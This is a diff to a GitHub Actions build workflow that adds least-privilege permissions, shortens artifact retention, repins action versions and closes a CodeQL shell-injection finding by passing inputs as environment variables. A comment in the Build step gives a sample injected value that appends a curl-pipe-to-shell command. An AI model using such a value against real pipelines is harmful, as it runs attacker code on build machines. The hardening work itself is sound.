@@ -1,5 +1,11 @@
 name: Build
 
+# Default least-privilege permissions for the workflow. Individual jobs
+# below raise to write where they actually need it (Docker push, SARIF
+# upload, etc.). Closes Scorecard TokenPermissionsID #513.
+permissions:
+  contents: read
+
 on:
   workflow_call:
     inputs:
@@ -36,10 +42,14 @@ on:
         type: boolean
         default: false
       retention_days:
+        # 1 day is enough to chain build → release → docker within the same
+        # workflow run; downloads inside a run work even after "expiry".
+        # Higher retention multiplies the 3-platform artifact set (~2 GB)
+        # against the 0.5 GB org storage cap and overflows it within a day.
         description: Artifact retention in days
         required: false
         type: number
-        default: 3
+        default: 1
 
 jobs:
   build:
@@ -80,7 +90,7 @@ jobs:
           ref: ${{ inputs.ref }}
           submodules: recursive
       - name: Set up pnpm
-        uses: pnpm/action-setup@41ff72655975bd51cab0327fa583b6e92b6d3061 # v4
+        uses: pnpm/action-setup@fc06bc1257f339d1d5d8b3a19a8cae5388b55320 # v4
         with:
           version: 10.33.0
       - name: Set up vcpkg
@@ -113,14 +123,29 @@ jobs:
 
       - name: Initialize CodeQL
         if: inputs.codeql && matrix.platform == 'ubuntu'
-        uses: github/codeql-action/init@ae9ef3a1d2e3413523c3741725c30064970cc0d4 # v3
+        uses: github/codeql-action/init@03e4368ac7daa2bd82b3e85262f3bf87ee112f57 # v3
         with:
           languages: cpp
           build-mode: manual
           queries: security-and-quality
 
       - name: Build
-        run: ${{ matrix.builder_cmd }} build --verbose --autoinstall --version=${{ inputs.full_version }} --hash=${{ inputs.build_hash }} --stamp=${{ inputs.build_stamp }} ${{ inputs.nodownload && '--nodownload' || '' }}
+        # Pass the string inputs as env vars instead of template-interpolating
+        # them into the run: body — GitHub expands ${{ ... }} before the shell
+        # parses, so a value like  1.2"; curl x|sh; #  would inject shell.
+        # Closes CodeQL actions/code-injection/critical #631.
+        #
+        # `shell: bash` is required for windows-2022 — the runner defaults to
+        # PowerShell Core there, and pwsh's $FULL_VERSION resolves a pwsh
+        # variable, not the env var (env vars need $env:FULL_VERSION). Git
+        # Bash is pre-installed on the GitHub-hosted Windows image, and
+        # ./builder.cmd invokes correctly from bash.
+        shell: bash
+        env:
+          FULL_VERSION: ${{ inputs.full_version }}
+          BUILD_HASH: ${{ inputs.build_hash }}
+          BUILD_STAMP: ${{ inputs.build_stamp }}
+        run: ${{ matrix.builder_cmd }} build --verbose --autoinstall --version="$FULL_VERSION" --hash="$BUILD_HASH" --stamp="$BUILD_STAMP" ${{ inputs.nodownload && '--nodownload' || '' }}
 
       - name: Test
         if: inputs.codeql == false
@@ -149,7 +174,7 @@ jobs:
 
       - name: Perform CodeQL Analysis
         if: inputs.codeql && matrix.platform == 'ubuntu'
-        uses: github/codeql-action/analyze@ae9ef3a1d2e3413523c3741725c30064970cc0d4 # v3
+        uses: github/codeql-action/analyze@03e4368ac7daa2bd82b3e85262f3bf87ee112f57 # v3
         with:
           category: /language:cpp
 
